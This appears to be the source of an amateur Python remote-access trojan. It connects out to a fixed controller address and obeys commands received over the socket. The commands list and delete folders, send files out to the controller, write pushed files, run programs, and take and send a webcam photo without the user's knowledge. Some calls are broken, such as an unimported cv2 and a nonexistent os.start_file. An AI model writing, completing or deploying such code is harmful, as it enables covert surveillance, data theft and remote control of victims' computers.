import socket 
import os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.8.100",4559))
msg = "i conect"
msg=msg.encode('UTF-8')
s.send(msg)
def showlist(data):
        if(data=='ls'):
            f=os.getcwd()
            a=os.listdir(f)
            a=str(a)
            a=a.encode("UTF-8")
            s.send(a)
def deletFolder(data):
    if(data[-1] =="-"):
        os.rmdir(str(data[0:-1]))
        msg4="file delete sucssfule"
        msg4= msg4.encode("UTF-8")
        s.send(msg4)
def showdiractory(data):
    if(data =="where i am"):
        f=os.getcwd()
        f=f.encode('UTF-8')
        s.send(f)
def addfolder(data):    
    if(data[-1] =="+"):
        os.mkdir(str(data[0:-1]))
        msg3="file created sucssfule"
        msg3= msg3.encode("UTF-8")
        s.send(msg3)
def gopack(data):
    if(data =="cd .."):
        d=os.getcwd()
        d=os.path.dirname(str(d))
        os.chdir(str(d))
        msg5=os.getcwd()
        msg5=msg5.encode("UTF-8")
        s.send(msg5)
def gototoplace(data):
    if(data[:2] =="cd" ):
        a=os.getcwd()
        k=os.path.abspath(str(data[3:]))
        os.chdir(k)
        f=os.getcwd()
        f=f.encode("UTF-8")
        s.send(f)
while True:
    Rdata = s.recv(1024)
    data = Rdata.decode("UTF-8")
    showlist(data)
    deletFolder(data)
    showdiractory(data)
    addfolder(data)
    gopack(data)
    gototoplace(data)
    if(data[:3] =="get"):
        filename=str(data[4:])+"*"
        s.send(filename.encode('UTF-8'))
        file =open(filename[:-1],'rb')
        filesize = os.path.getsize(filename[:-1])
        filesize=str(filesize)
        s.send(filesize.encode('UTF-8'))
        data1 = file.read()
        s.sendall(data1)
        file.close()
        msg10="i done"
        msg10=msg10.encode("UTF-8")
        s.send(msg10)
    elif(data =="i recive file sucsesfule"):
        msg8='i send file sucsesfule  '
        msg8=msg8.encode("UTF-8")
        s.send(msg8)
    elif( data[:3] =="run"):
        os.start_file(data[4:])
        msg6="file hase ben run"
        msg6=msg6.encode("UTF-8")
        s.send(msg6)
    elif(data =="create file"):
        msg9="file has ben crated"
        msg9=msg9.encode("UTF-8")
        s.send(msg9)
        a=s.recv(500000)
        a=a.decode("UTF-8")
        b=os.open(a, os.O_RDWR | os.O_CREAT)
        k=s.recv(500000)
        os.write(b,k)
        os.close(b)
        msg10="file has been creates"
        msg10=msg10.encode("UTF-8")
        s.send(msg10)
    elif(data=="take photo"):
        a="photo take and send"
        a=a.encode("UTF-8")
        s.send(a)
        cam =cv2.VideoCapture(0)
        cont=0
        ret,image=cam.read()
        cv2.imwrite("seif{5}.jpeg",image)
        f=open("seif{5}.jpeg",'rb')
        k=f.read()
        s.sendall(k)
        del(cam)
        f.close()
        msg10="i done"
        msg10=msg10.encode("UTF-8")
        s.send(msg10)
    else:
        msg0="i dont undrstande"
        msg0=msg0.encode("UTF-8")
        s.send(msg0)
